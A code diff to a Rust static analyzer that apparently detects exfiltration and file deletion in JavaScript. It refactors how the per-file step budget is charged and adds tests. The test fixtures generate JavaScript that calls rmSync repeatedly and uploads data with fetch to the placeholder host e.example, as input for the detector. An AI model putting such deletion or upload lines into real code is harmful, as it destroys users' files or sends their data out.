@@ -211,11 +211,17 @@ impl<'s, 'a> Flow<'s, 'a> {
     /// Starts reading one candidate, with [`MAX_STEPS`] or what is left of
     /// the file's steps.
     fn begin_candidate(&mut self) {
-        let spent = self.granted - self.steps;
-        self.file_steps = self.file_steps.saturating_sub(spent);
+        self.settle_candidate();
         self.granted = MAX_STEPS.min(self.file_steps);
         self.over_budget |= self.granted < MAX_STEPS;
         self.steps = self.granted;
+    }
+
+    /// Charges the file for the steps the last candidate spent.
+    fn settle_candidate(&mut self) {
+        let spent = self.granted - self.steps;
+        self.file_steps = self.file_steps.saturating_sub(spent);
+        self.granted = self.steps;
     }
 
     fn object_fields(&self, object: &ObjectExpression<'_>) -> Rc<ObjectFields> {
@@ -855,7 +861,7 @@ pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::Call
     if has_sources {
         exfiltration(&mut flow, facts);
     }
-    flow.begin_candidate();
+    flow.settle_candidate();
     facts.over_budget |= flow.over_budget;
 }
 
@@ -1236,6 +1242,48 @@ mod tests {
             shapes_time < flat_time * 5,
             "shapes {shapes_time:?}, side by side {flat_time:?}"
         );
+    }
+
+    #[test]
+    fn a_deep_declaration_is_read_once_for_every_removal_of_it() {
+        // Each removal followed its path to a declaration with no value and
+        // walked from there to the root looking for a `for…of`.
+        let depth = 8_000;
+        let removals = "rmSync(x);".repeat(8_000);
+        let deep = [format!(
+            "const {{rmSync}}=require('fs');{removals}{}",
+            nested("{", "var x;", "}", depth)
+        )];
+        let shallow = [format!(
+            "const {{rmSync}}=require('fs');var x;{removals}{}",
+            nested("{", "", "}", depth)
+        )];
+        let deep_time = time_to_analyze(&deep);
+        let shallow_time = time_to_analyze(&shallow);
+        assert!(
+            deep_time < shallow_time * 5,
+            "deep {deep_time:?}, shallow {shallow_time:?}"
+        );
+    }
+
+    #[test]
+    fn a_file_whose_candidates_spend_exactly_its_steps_is_complete() {
+        // A file under 64 KiB gets 16 candidates' worth of steps; each of
+        // these uploads spends all of a candidate's.
+        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
+        let reads = "o.x,".repeat(4_095);
+        let source = |uploads: usize| {
+            format!(
+                "require('fs');const o={{{fields}}};const a=[{reads}];{}",
+                "fetch('https://e.example',{body:a});".repeat(uploads)
+            )
+        };
+        let complete = source(16);
+        assert!(complete.len() < super::FILE_STEPS_FLOOR);
+        let result = super::super::analyze_bytes("index.js", complete.as_bytes());
+        assert_eq!(result.unparsed_files, 0);
+        let over = super::super::analyze_bytes("index.js", source(17).as_bytes());
+        assert_eq!(over.unparsed_files, 1);
     }
 
     #[test]
